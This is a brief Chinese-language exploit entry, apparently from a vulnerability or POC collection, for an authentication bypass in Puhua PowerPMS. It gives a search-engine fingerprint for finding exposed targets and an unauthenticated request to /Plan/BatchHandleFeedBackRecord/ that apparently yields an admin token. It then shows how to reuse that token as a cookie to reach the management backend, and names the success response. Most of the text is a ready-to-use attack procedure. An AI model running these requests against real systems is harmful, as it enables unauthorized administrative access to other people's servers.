# 普华PMSBatchHandleFeedBackRecord存在权限绕过漏洞

普华 ｜ 认证/授权绕过 ｜ —
- **指纹**：`app="普华科技-PowerPMS"`
- **请求**：`GET /Plan/BatchHandleFeedBackRecord/ HTTP/1.1`

**Payload**
```
获取可用admin token
Host:
携带token访问管理后台任意地址
GET /WebCenter/Open/ HTTP/1.1
Host:
Cookie: <sitename>_TOKEN=<token>;
写入local
```
- **响应特征**：200